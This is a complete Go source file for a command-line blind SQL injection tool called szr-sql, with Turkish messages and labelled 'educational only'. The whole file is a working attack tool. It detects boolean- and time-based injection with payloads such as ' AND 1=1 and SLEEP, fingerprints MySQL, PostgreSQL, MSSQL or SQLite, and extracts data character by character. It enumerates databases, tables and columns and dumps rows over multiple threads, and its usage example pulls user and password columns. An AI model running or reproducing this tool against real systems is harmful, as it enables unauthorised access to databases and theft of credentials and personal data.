package main

import (
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const banner = `
  ███████╗███████╗██████╗       ███████╗ ██████╗ ██╗
  ██╔════╝╚══███╔╝██╔══██╗      ██╔════╝██╔═══██╗██║
  ███████╗  ███╔╝ ██████╔╝█████╗███████╗██║   ██║██║
  ╚════██║ ███╔╝  ██╔══██╗╚════╝╚════██║██║▄▄ ██║██║
  ███████║███████╗██║  ██║      ███████║╚██████╔╝███████╗
  ╚══════╝╚══════╝╚═╝  ╚═╝      ╚══════╝ ╚══▀▀═╝ ╚══════╝
              szr-sql  ·  v0.7  ·  educational only
`

type Profile struct {
	Name, Sleep, Substr, Ascii, Length, Comment string
	FromSchema, FromTables, FromColumns         string
}

var profiles = map[string]Profile{
	"mysql": {"mysql", "SLEEP({d})", "SUBSTR(({q}),{p},1)", "ASCII({s})", "LENGTH(({q}))",
		"-- -", "information_schema.schemata", "information_schema.tables", "information_schema.columns"},
	"postgresql": {"postgresql", "pg_sleep({d})", "SUBSTR(({q}),{p},1)", "ASCII({s})", "LENGTH(({q}))",
		"--", "information_schema.schemata", "information_schema.tables", "information_schema.columns"},
	"mssql": {"mssql", "WAITFOR DELAY '0:0:{d}'", "SUBSTRING(({q}),{p},1)", "ASCII({s})", "LEN(({q}))",
		"--", "information_schema.schemata", "information_schema.tables", "information_schema.columns"},
	"sqlite": {"sqlite", "", "SUBSTR(({q}),{p},1)", "UNICODE({s})", "LENGTH(({q}))",
		"--", "sqlite_master", "sqlite_master", "sqlite_master"},
}

type Result struct {
	Target    TargetInfo            `json:"target"`
	Detect    DetectInfo            `json:"detection"`
	DBMS      DBMSInfo              `json:"dbms"`
	Databases []string              `json:"databases,omitempty"`
	Tables    map[string][]string   `json:"tables,omitempty"`
	Columns   map[string][]string   `json:"columns,omitempty"`
	Dumps     map[string][][]string `json:"dumps,omitempty"`
	StartedAt time.Time             `json:"started_at"`
	EndedAt   time.Time             `json:"ended_at,omitempty"`
	Duration  string                `json:"duration,omitempty"`
}

type TargetInfo struct {
	URL, Method, Param string
	Extra              map[string]string `json:"extra,omitempty"`
}

type DetectInfo struct {
	BaselineSec  float64 `json:"baseline_sec"`
	TimeBased    bool    `json:"time_based"`
	BooleanBased bool    `json:"boolean_based"`
	Vulnerable   bool    `json:"vulnerable"`
}

type DBMSInfo struct {
	Name, Version string `json:"version"`
}

type Injector struct {
	client                                *http.Client
	baseURL, method, param, value, cookie string
	extraQuery, postData                  url.Values
	verbose                               bool
	threads                               int
	baseline                              time.Duration
	trueRef, falseRef                     []byte
	profile                               Profile
	result                                *Result

	mu          sync.Mutex
	printMu     sync.Mutex
	sem         chan struct{}
	ratelimited atomic.Bool
}

func NewInjector(rawURL, method, data, extra, cookie, paramSel string, timeout, threads int, verbose bool) (*Injector, error) {
	u, err := url.Parse(rawURL)
	if err != nil {
		return nil, err
	}
	if threads < 1 {
		threads = 1
	}
	extraQuery := cloneValues(u.Query())
	postData := url.Values{}

	if data != "" {
		if postData, err = url.ParseQuery(data); err != nil {
			return nil, fmt.Errorf("POST data: %w", err)
		}
		if method == "" {
			method = "POST"
		}
	}
	if method == "" {
		method = "GET"
	}
	method = strings.ToUpper(method)
	if method != "GET" && method != "POST" {
		return nil, fmt.Errorf("desteklenmeyen method: %s", method)
	}
	if extra != "" {
		e, err := url.ParseQuery(extra)
		if err != nil {
			return nil, fmt.Errorf("extra: %w", err)
		}
		for k, vv := range e {
			for _, v := range vv {
				extraQuery.Add(k, v)
			}
		}
	}

	var param, value string
	if paramSel != "" {
		param = paramSel
		if v, ok := extraQuery[paramSel]; ok && len(v) > 0 {
			value = v[0]
			delete(extraQuery, paramSel)
		} else if v, ok := postData[paramSel]; ok && len(v) > 0 {
			value = v[0]
			delete(postData, paramSel)
		} else {
			return nil, fmt.Errorf("parametre bulunamadı: %s", paramSel)
		}
	} else {
		if method == "POST" && len(postData) > 0 {
			for k, v := range postData {
				param, value = k, v[0]
				delete(postData, k)
				break
			}
		}
		if param == "" {
			for k, v := range extraQuery {
				param, value = k, v[0]
				delete(extraQuery, k)
				break
			}
		}
		if param == "" {
			return nil, fmt.Errorf("enjeksiyon noktası yok (-p)")
		}
	}

	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	client := &http.Client{
		Timeout:   time.Duration(timeout) * time.Second,
		Transport: tr,
		CheckRedirect: func(*http.Request, []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	extraMap := map[string]string{}
	for k, v := range extraQuery {
		if len(v) > 0 {
			extraMap[k] = v[0]
		}
	}
	res := &Result{
		Target:    TargetInfo{URL: rawURL, Method: method, Param: param, Extra: extraMap},
		Tables:    map[string][]string{},
		Columns:   map[string][]string{},
		Dumps:     map[string][][]string{},
		StartedAt: time.Now(),
	}
	return &Injector{
		client: client, baseURL: u.Scheme + "://" + u.Host + u.Path,
		method: method, param: param, value: value,
		extraQuery: extraQuery, postData: postData, cookie: cookie,
		verbose: verbose, threads: threads,
		result: res,
		sem:    make(chan struct{}, threads),
	}, nil
}

func (i *Injector) logf(f string, a ...any) {
	i.printMu.Lock()
	defer i.printMu.Unlock()
	fmt.Printf(f, a...)
}

func isRateLimitResponse(code int, body []byte) bool {
	if code == 429 || code == 503 {
		return true
	}
	if code >= 200 && code < 300 && len(body) > 0 {
		s := strings.ToLower(string(body))
		if len(s) > 64*1024 {
			s = s[:64*1024]
		}
		for _, p := range []string{
			"too many requests", "rate limit", "rate-limit",
			"cloudflare", "captcha required", "please slow down",
		} {
			if strings.Contains(s, p) {
				return true
			}
		}
	}
	return false
}

func (i *Injector) send(payload string) ([]byte, time.Duration, error) {
	if i.ratelimited.Load() {
		return nil, 0, fmt.Errorf("rate limited")
	}
	i.sem <- struct{}{}
	defer func() { <-i.sem }()
	if i.ratelimited.Load() {
		return nil, 0, fmt.Errorf("rate limited")
	}

	var req *http.Request
	var err error
	if i.method == "POST" {
		bodyData := cloneValues(i.postData)
		bodyData.Set(i.param, payload)
		reqURL := i.baseURL
		if len(i.extraQuery) > 0 {
			reqURL += "?" + i.extraQuery.Encode()
		}
		req, err = http.NewRequest("POST", reqURL, strings.NewReader(bodyData.Encode()))
		if err != nil {
			return nil, 0, err
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	} else {
		q := cloneValues(i.extraQuery)
		q.Set(i.param, payload)
		req, err = http.NewRequest("GET", i.baseURL+"?"+q.Encode(), nil)
		if err != nil {
			return nil, 0, err
		}
	}
	if i.cookie != "" {
		req.Header.Set("Cookie", i.cookie)
	}
	req.Header.Set("User-Agent", "szr-sql/0.7 (educational)")

	start := time.Now()
	resp, err := i.client.Do(req)
	elapsed := time.Since(start)
	if err != nil {
		return nil, elapsed, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	if isRateLimitResponse(resp.StatusCode, body) {
		i.ratelimited.Store(true)
		return body, elapsed, fmt.Errorf("rate limit (HTTP %d)", resp.StatusCode)
	}
	if i.verbose {
		i.logf("    → [%s] %q  (%d byte, %.2fs)\n",
			i.method, truncate(payload, 60), len(body), elapsed.Seconds())
	}
	return body, elapsed, nil
}

func (i *Injector) MeasureBaseline(samples int) error {
	var total time.Duration
	for s := 0; s < samples; s++ {
		_, t, err := i.send(i.value)
		if err != nil {
			return err
		}
		total += t
		time.Sleep(200 * time.Millisecond)
	}
	base := total / time.Duration(samples)
	i.mu.Lock()
	i.baseline = base
	i.result.Detect.BaselineSec = base.Seconds()
	i.mu.Unlock()
	i.logf("[+] Baseline: %.2fs  [method=%s param=%s]\n",
		base.Seconds(), i.method, i.param)
	return nil
}

func (i *Injector) DetectBooleanBased() bool {
	falsePayload := fmt.Sprintf("%s' AND 1=2%s", i.value, profiles["mysql"].Comment)
	falseBody, _, err := i.send(falsePayload)
	if err != nil {
		return false
	}
	truePayload := fmt.Sprintf("%s' AND 1=1%s", i.value, profiles["mysql"].Comment)
	trueBody, _, err := i.send(truePayload)
	if err != nil {
		return false
	}

	diff := abs(len(trueBody) - len(falseBody))
	i.logf("[bool] |len(TRUE)-len(FALSE)| = %d\n", diff)
	if diff <= 20 {
		return false
	}

	i.mu.Lock()
	i.trueRef = trueBody
	i.falseRef = falseBody
	i.result.Detect.BooleanBased = true
	i.mu.Unlock()
	return true
}

func (i *Injector) DetectTimeBased() bool {
	if i.profile.Sleep == "" {
		i.logf("[time] %s SLEEP desteklemiyor, atlandı\n", i.profile.Name)
		return false
	}
	base := i.baseline
	for _, d := range []int{3, 6} {
		sleepExpr := strings.Replace(i.profile.Sleep, "{d}", fmt.Sprint(d), 1)
		payload := fmt.Sprintf("%s' AND %s%s", i.value, sleepExpr, i.profile.Comment)
		_, t, err := i.send(payload)
		if err != nil {
			return false
		}
		expected := base + time.Duration(d)*time.Second
		i.logf("[time] %s(%d) → %.2fs (beklenen ~%.2fs)\n",
			i.profile.Name, d, t.Seconds(), expected.Seconds())
		if t < base+time.Duration(float64(d)*0.8*float64(time.Second)) {
			return false
		}
	}
	i.mu.Lock()
	i.result.Detect.TimeBased = true
	i.mu.Unlock()
	return true
}

func (i *Injector) isTrue(payload string) bool {
	body, _, err := i.send(payload)
	if err != nil {
		return false
	}
	i.mu.Lock()
	tRef, fRef := i.trueRef, i.falseRef
	i.mu.Unlock()
	if tRef == nil || fRef == nil {
		return false
	}
	dTrue := abs(len(body) - len(tRef))
	dFalse := abs(len(body) - len(fRef))
	return dTrue < dFalse
}

func (i *Injector) asciiAt(query string, pos int) int {
	lo, hi := 32, 127
	for lo < hi {
		if i.ratelimited.Load() {
			return 0
		}
		mid := (lo + hi) / 2
		sub := strings.Replace(i.profile.Substr, "{q}", query, 1)
		sub = strings.Replace(sub, "{p}", fmt.Sprint(pos), 1)
		asc := strings.Replace(i.profile.Ascii, "{s}", sub, 1)
		payload := fmt.Sprintf("%s' AND %s > %d%s", i.value, asc, mid, i.profile.Comment)
		if i.isTrue(payload) {
			lo = mid + 1
		} else {
			hi = mid
		}
	}
	return lo
}

func (i *Injector) extract(query string, maxLen int) string {
	lo, hi := 0, maxLen
	for lo < hi {
		if i.ratelimited.Load() {
			return ""
		}
		mid := (lo + hi) / 2
		lengthExpr := strings.Replace(i.profile.Length, "{q}", query, 1)
		payload := fmt.Sprintf("%s' AND %s > %d%s", i.value, lengthExpr, mid, i.profile.Comment)
		if i.isTrue(payload) {
			lo = mid + 1
		} else {
			hi = mid
		}
	}
	n := lo
	if n == 0 || n > maxLen {
		return ""
	}
	var sb strings.Builder
	for p := 1; p <= n; p++ {
		if i.ratelimited.Load() {
			return ""
		}
		c := i.asciiAt(query, p)
		if c < 32 || c > 126 {
			break
		}
		sb.WriteByte(byte(c))
	}
	return sb.String()
}

func (i *Injector) Fingerprint() error {
	i.logf("[*] DBMS parmak izi...\n")
	probes := []struct{ dbms, query string }{
		{"mysql", "SELECT @@version"},
		{"postgresql", "SELECT version()"},
		{"mssql", "SELECT @@version"},
		{"sqlite", "SELECT sqlite_version()"},
	}
	for _, p := range probes {
		if i.ratelimited.Load() {
			return fmt.Errorf("rate limited")
		}
		i.profile = profiles[p.dbms]
		if ver := i.extract(p.query, 60); ver != "" && strings.ContainsAny(ver, "0123456789") {
			i.mu.Lock()
			i.result.DBMS.Name = p.dbms
			i.result.DBMS.Version = ver
			i.mu.Unlock()
			i.logf("[+] %s → %s\n", p.dbms, truncate(ver, 40))
			return nil
		}
	}
	i.logf("[!] Parmak izi başarısız, MySQL varsayılıyor\n")
	i.profile = profiles["mysql"]
	i.mu.Lock()
	i.result.DBMS.Name = "mysql"
	i.mu.Unlock()
	return nil
}

func (i *Injector) EnumDatabases(limit int) []string {
	i.logf("\n[*] Veritabanları...\n")
	var dbs []string
	for n := 0; n < limit; n++ {
		if i.ratelimited.Load() {
			break
		}
		q := fmt.Sprintf("SELECT schema_name FROM %s LIMIT %d,1", i.profile.FromSchema, n)
		name := i.extract(q, 32)
		if name == "" || contains(dbs, name) {
			break
		}
		dbs = append(dbs, name)
		i.logf("    [%d] %s\n", n, name)
	}
	i.mu.Lock()
	i.result.Databases = dbs
	i.mu.Unlock()
	return dbs
}

func (i *Injector) EnumTables(db string, limit int) []string {
	i.logf("[*] %s tabloları...\n", db)
	var tabs []string
	for n := 0; n < limit; n++ {
		if i.ratelimited.Load() {
			break
		}
		q := fmt.Sprintf("SELECT table_name FROM %s WHERE table_schema='%s' LIMIT %d,1",
			i.profile.FromTables, db, n)
		name := i.extract(q, 32)
		if name == "" || contains(tabs, name) {
			break
		}
		tabs = append(tabs, name)
		i.logf("    [%d] %s\n", n, name)
	}
	i.mu.Lock()
	i.result.Tables[db] = tabs
	i.mu.Unlock()
	return tabs
}

func (i *Injector) EnumColumns(db, table string, limit int) []string {
	i.logf("[*] %s.%s sütunları...\n", db, table)
	var cols []string
	for n := 0; n < limit; n++ {
		if i.ratelimited.Load() {
			break
		}
		q := fmt.Sprintf("SELECT column_name FROM %s WHERE table_schema='%s' AND table_name='%s' LIMIT %d,1",
			i.profile.FromColumns, db, table, n)
		name := i.extract(q, 32)
		if name == "" || contains(cols, name) {
			break
		}
		cols = append(cols, name)
		i.logf("    [%d] %s\n", n, name)
	}
	i.mu.Lock()
	i.result.Columns[db+"."+table] = cols
	i.mu.Unlock()
	return cols
}

type dumpJob struct{ r, c int }

func (i *Injector) Dump(db, table string, columns []string, rows int) {
	i.logf("\n[*] %s.%s dökümü (%d satır × %d kolon, th=%d)\n",
		db, table, rows, len(columns), i.threads)

	cells := make([][]string, rows)
	for r := range cells {
		cells[r] = make([]string, len(columns))
	}

	jobs := make(chan dumpJob, i.threads*2)
	var wg sync.WaitGroup
	for w := 0; w < i.threads; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := range jobs {
				if i.ratelimited.Load() {
					return
				}
				q := fmt.Sprintf("SELECT %s FROM %s.%s LIMIT %d,1",
					columns[j.c], db, table, j.r)
				cells[j.r][j.c] = i.extract(q, 64)
			}
		}()
	}
	for r := 0; r < rows; r++ {
		if i.ratelimited.Load() {
			break
		}
		for c := range columns {
			jobs <- dumpJob{r, c}
		}
	}
	close(jobs)
	wg.Wait()

	var all [][]string
	for r := 0; r < rows; r++ {
		empty := true
		for _, v := range cells[r] {
			if v != "" {
				empty = false
				break
			}
		}
		if empty {
			break
		}
		all = append(all, cells[r])
		parts := make([]string, len(columns))
		for c := range columns {
			v := cells[r][c]
			if v == "" {
				v = "<null>"
			}
			parts[c] = fmt.Sprintf("%s=%q", columns[c], v)
		}
		i.logf("    [%d] %s\n", r, strings.Join(parts, " "))
	}
	i.mu.Lock()
	i.result.Dumps[db+"."+table] = all
	i.mu.Unlock()
}

func (r *Result) finalize() {
	r.EndedAt = time.Now()
	r.Duration = r.EndedAt.Sub(r.StartedAt).Round(time.Millisecond).String()
	r.Detect.Vulnerable = r.Detect.TimeBased || r.Detect.BooleanBased
}

func saveResult(res *Result, path string) error {
	ext := strings.ToLower(filepath.Ext(path))
	var data []byte
	var err error
	switch ext {
	case ".json":
		data, err = json.MarshalIndent(res, "", "  ")
	case ".txt":
		data = []byte(formatText(res))
	case ".md":
		data = []byte(formatMarkdown(res))
	default:
		if ext == "" {
			path += ".json"
		}
		data, err = json.MarshalIndent(res, "", "  ")
	}
	if err != nil {
		return err
	}
	if err := os.WriteFile(path, data, 0644); err != nil {
		return err
	}
	fmt.Printf("\n[+] Sonuç → %s\n", path)
	return nil
}

func formatText(r *Result) string {
	var b strings.Builder
	w := func(f string, a ...any) { fmt.Fprintf(&b, f, a...) }
	w("=== szr-sql ===\n")
	w("Target : %s [%s] param=%s\n", r.Target.URL, r.Target.Method, r.Target.Param)
	w("Duration: %s\n\n", r.Duration)
	w("--- Detection ---\nTime=%v Boolean=%v Vuln=%v Baseline=%.2fs\n\n",
		r.Detect.TimeBased, r.Detect.BooleanBased, r.Detect.Vulnerable, r.Detect.BaselineSec)
	if r.DBMS.Name != "" {
		w("DBMS: %s (%s)\n\n", r.DBMS.Name, r.DBMS.Version)
	}
	if len(r.Databases) > 0 {
		w("--- Databases ---\n")
		for _, d := range r.Databases {
			w("  - %s\n", d)
		}
		w("\n")
	}
	for db, tabs := range r.Tables {
		w("--- Tables [%s] ---\n", db)
		for _, t := range tabs {
			w("  - %s\n", t)
		}
		w("\n")
	}
	for k, cols := range r.Columns {
		w("--- Columns [%s] ---\n  %v\n\n", k, cols)
	}
	for k, rows := range r.Dumps {
		w("--- Dump [%s] ---\n", k)
		for i, row := range rows {
			w("  [%d] %v\n", i, row)
		}
	}
	return b.String()
}

func formatMarkdown(r *Result) string {
	var b strings.Builder
	w := func(f string, a ...any) { fmt.Fprintf(&b, f, a...) }
	w("# szr-sql result\n\n")
	w("| Alan | Değer |\n|---|---|\n")
	w("| Target | `%s` |\n| Method | `%s` |\n| Param | `%s` |\n| Duration | %s |\n\n",
		r.Target.URL, r.Target.Method, r.Target.Param, r.Duration)
	w("## Detection\n\n- Time: %s\n- Boolean: %s\n- Vulnerable: %s\n- Baseline: %.2fs\n\n",
		boolEmoji(r.Detect.TimeBased), boolEmoji(r.Detect.BooleanBased),
		boolEmoji(r.Detect.Vulnerable), r.Detect.BaselineSec)
	if r.DBMS.Name != "" {
		w("## DBMS\n\n- **%s** `%s`\n\n", r.DBMS.Name, r.DBMS.Version)
	}
	if len(r.Databases) > 0 {
		w("## Databases\n\n")
		for _, d := range r.Databases {
			w("- `%s`\n", d)
		}
		w("\n")
	}
	for db, tabs := range r.Tables {
		w("## Tables — %s\n\n", db)
		for _, t := range tabs {
			w("- `%s`\n", t)
		}
		w("\n")
	}
	for k, cols := range r.Columns {
		w("## Columns — %s\n\n", k)
		for _, c := range cols {
			w("- `%s`\n", c)
		}
		w("\n")
	}
	for k, rows := range r.Dumps {
		w("## Dump — %s\n\n", k)
		for i, row := range rows {
			w("- Row %d: `%v`\n", i, row)
		}
		w("\n")
	}
	return b.String()
}

func boolEmoji(b bool) string {
	if b {
		return "✅"
	}
	return "❌"
}

func cloneValues(v url.Values) url.Values {
	out := url.Values{}
	for k, vv := range v {
		out[k] = append([]string{}, vv...)
	}
	return out
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

func abs(x int) int {
	if x < 0 {
		return -x
	}
	return x
}

func contains(s []string, x string) bool {
	for _, v := range s {
		if v == x {
			return true
		}
	}
	return false
}

func isSystemDB(n string) bool {
	switch strings.ToLower(n) {
	case "information_schema", "mysql", "performance_schema", "sys",
		"master", "tempdb", "model", "msdb",
		"postgres", "template0", "template1", "pg_catalog", "pg_toast":
		return true
	}
	return false
}

func usage() {
	fmt.Fprintf(os.Stderr, `szr-sql — eğitim amaçlı SQL injection aracı

Komutlar: scan | dbs | tables | columns | dump | all

Global flags:
  -u, --url      hedef URL (zorunlu)
  -c, --cookie   Cookie
  -X, --method   GET/POST
  -d, --data     POST body
  -e, --extra    ekstra query params
  -p, --param    enjekte edilecek parametre
  -t, --timeout  zaman aşımı (sn)
  -th,--threads  paralel istek (varsayılan 1)
  -v, --verbose  ayrıntılı
  -o, --output   .json/.txt/.md

Sadece dump/all:
  -D, --db    veritabanı
  -T, --table tablo
  -C, --cols  sadece bu kolonlar (virgülle)
  -rows       satır sayısı (varsayılan 5)
  --dump-all  all içinde veriyi de çek

Örnek:
  %s all     -u "http://t/?id=1" -th 5 -o rapor.md
  %s dump    -u "http://t/?id=1" -D dvwa -T users -C user,password -th 3
  %s dbs     -u "http://t/?id=1"
`, os.Args[0], os.Args[0], os.Args[0])
}

func main() {
	if len(os.Args) < 2 {
		fmt.Print(banner)
		usage()
		os.Exit(1)
	}
	sub := os.Args[1]
	if sub == "help" || sub == "-h" || sub == "--help" {
		fmt.Print(banner)
		usage()
		return
	}
	fmt.Print(banner)

	args := os.Args[2:]
	fs := flag.NewFlagSet(sub, flag.ExitOnError)
	var (
		rawURL, cookie, method, data, extra, paramSel, output, db, table, cols string
		timeout, rows, threads                                                int
		verbose, dumpAll                                                      bool
	)
	fs.StringVar(&rawURL, "u", "", "")
	fs.StringVar(&rawURL, "url", "", "")
	fs.StringVar(&cookie, "c", "", "")
	fs.StringVar(&cookie, "cookie", "", "")
	fs.StringVar(&method, "X", "GET", "")
	fs.StringVar(&method, "method", "GET", "")
	fs.StringVar(&data, "d", "", "")
	fs.StringVar(&data, "data", "", "")
	fs.StringVar(&extra, "e", "", "")
	fs.StringVar(&extra, "extra", "", "")
	fs.StringVar(&paramSel, "p", "", "")
	fs.StringVar(&paramSel, "param", "", "")
	fs.IntVar(&timeout, "t", 30, "")
	fs.IntVar(&timeout, "timeout", 30, "")
	fs.IntVar(&threads, "th", 1, "")
	fs.IntVar(&threads, "threads", 1, "")
	fs.BoolVar(&verbose, "v", false, "")
	fs.BoolVar(&verbose, "verbose", false, "")
	fs.StringVar(&output, "o", "", "")
	fs.StringVar(&output, "output", "", "")
	fs.StringVar(&db, "D", "", "")
	fs.StringVar(&db, "db", "", "")
	fs.StringVar(&table, "T", "", "")
	fs.StringVar(&table, "table", "", "")
	fs.StringVar(&cols, "C", "", "")
	fs.StringVar(&cols, "cols", "", "")
	fs.IntVar(&rows, "rows", 5, "")
	fs.BoolVar(&dumpAll, "dump-all", false, "")

	fs.Parse(args)
	if rawURL == "" {
		fmt.Fprintln(os.Stderr, "[-] -u/--url zorunlu")
		os.Exit(1)
	}

	inj, err := NewInjector(rawURL, method, data, extra, cookie, paramSel, timeout, threads, verbose)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] %v\n", err)
		os.Exit(1)
	}

	ok := true
	switch sub {
	case "scan":
		ok = runScan(inj)
	case "dbs":
		ok = runEnum(inj, "dbs", db, table, cols, rows)
	case "tables":
		if db == "" {
			fmt.Fprintln(os.Stderr, "[-] -D gerekli")
			os.Exit(1)
		}
		ok = runEnum(inj, "tables", db, table, cols, rows)
	case "columns":
		if db == "" || table == "" {
			fmt.Fprintln(os.Stderr, "[-] -D -T gerekli")
			os.Exit(1)
		}
		ok = runEnum(inj, "columns", db, table, cols, rows)
	case "dump":
		if db == "" || table == "" {
			fmt.Fprintln(os.Stderr, "[-] -D -T gerekli")
			os.Exit(1)
		}
		ok = runEnum(inj, "dump", db, table, cols, rows)
	case "all":
		ok = runAll(inj, db, table, cols, rows, dumpAll)
	default:
		usage()
		os.Exit(1)
	}

	inj.result.finalize()
	if output != "" {
		if err := saveResult(inj.result, output); err != nil {
			fmt.Fprintf(os.Stderr, "[-] kaydet: %v\n", err)
		}
	}
	if inj.ratelimited.Load() {
		fmt.Fprintln(os.Stderr, "\n[-] Rate limit algılandı — kısmi sonuç kaydedildi")
		os.Exit(2)
	}
	if !ok {
		os.Exit(1)
	}
}

func prepare(inj *Injector) bool {
	if err := inj.MeasureBaseline(3); err != nil {
		fmt.Fprintf(os.Stderr, "[-] baseline: %v\n", err)
		return false
	}
	boolOK := inj.DetectBooleanBased()
	if boolOK {
		if err := inj.Fingerprint(); err != nil {
			return false
		}
		_ = inj.DetectTimeBased()
		return true
	}
	inj.profile = profiles["mysql"]
	if inj.DetectTimeBased() {
		inj.result.DBMS.Name = "mysql (assumed)"
		return true
	}
	fmt.Fprintln(os.Stderr, "[-] Zafiyet doğrulanamadı")
	return false
}

func runScan(inj *Injector) bool {
	fmt.Println("[*] Baseline...")
	if err := inj.MeasureBaseline(3); err != nil {
		fmt.Fprintf(os.Stderr, "[-] %v\n", err)
		return false
	}
	fmt.Println("[*] Boolean-based...")
	boolOK := inj.DetectBooleanBased()

	timeOK := false
	if boolOK {
		_ = inj.Fingerprint()
		fmt.Println("[*] Time-based (profil ile)...")
		timeOK = inj.DetectTimeBased()
	} else {
		fmt.Println("[*] Time-based (fallback mysql)...")
			inj.profile = profiles["mysql"]
		timeOK = inj.DetectTimeBased()
	}

	if !boolOK && !timeOK {
		fmt.Println("\n[-] Zafiyet bulunamadı")
		return false
	}
	fmt.Printf("\n[+] Zafiyet DOĞRULANDI (bool=%v time=%v)\n", boolOK, timeOK)
	return true
}

func runEnum(inj *Injector, mode, db, table, cols string, rows int) bool {
	if !prepare(inj) {
		return false
	}
	switch mode {
	case "dbs":
		inj.EnumDatabases(8)
	case "tables":
		inj.EnumTables(db, 15)
	case "columns":
		inj.EnumColumns(db, table, 25)
	case "dump":
		var columnList []string
		if cols != "" {
			for _, c := range strings.Split(cols, ",") {
				if c = strings.TrimSpace(c); c != "" {
					columnList = append(columnList, c)
				}
			}
			inj.logf("[+] -C: kolon enum atlandı: %v\n", columnList)
		} else {
			columnList = inj.EnumColumns(db, table, 25)
		}
		if len(columnList) > 0 {
			inj.Dump(db, table, columnList, rows)
		}
	}
	return true
}

func runAll(inj *Injector, dbFilter, tableFilter, colsFilter string, rows int, dumpAll bool) bool {
	if !prepare(inj) {
		return false
	}
	allDBs := inj.EnumDatabases(8)
	var targets []string
	if dbFilter != "" {
		targets = []string{dbFilter}
	} else {
		for _, d := range allDBs {
			if !isSystemDB(d) {
				targets = append(targets, d)
			}
		}
		if len(targets) == 0 {
			targets = allDBs
		}
	}

	var wg sync.WaitGroup
	for _, db := range targets {
		if inj.ratelimited.Load() {
			break
		}
		db := db
		wg.Add(1)
		go func() {
			defer wg.Done()
			inj.processDB(db, tableFilter, colsFilter, rows, dumpAll)
		}()
	}
	wg.Wait()

	if !dumpAll {
		fmt.Println("\n[i] --dump-all verilmedi → veri çekilmedi")
	}
	return true
}

func (i *Injector) processDB(db, tableFilter, colsFilter string, rows int, dumpAll bool) {
	var tables []string
	if tableFilter != "" {
		tables = []string{tableFilter}
	} else {
		tables = i.EnumTables(db, 15)
	}
	if len(tables) == 0 {
		return
	}
	var wg sync.WaitGroup
	for _, t := range tables {
		if i.ratelimited.Load() {
			break
		}
		t := t
		wg.Add(1)
		go func() {
			defer wg.Done()
			i.processTable(db, t, colsFilter, rows, dumpAll)
		}()
	}
	wg.Wait()
}

func (i *Injector) processTable(db, table, colsFilter string, rows int, dumpAll bool) {
	var cols []string
	if colsFilter != "" {
		for _, c := range strings.Split(colsFilter, ",") {
			if c = strings.TrimSpace(c); c != "" {
				cols = append(cols, c)
			}
		}
	} else {
		cols = i.EnumColumns(db, table, 25)
	}
	if dumpAll && len(cols) > 0 && !i.ratelimited.Load() {
		i.Dump(db, table, cols, rows)
	}
}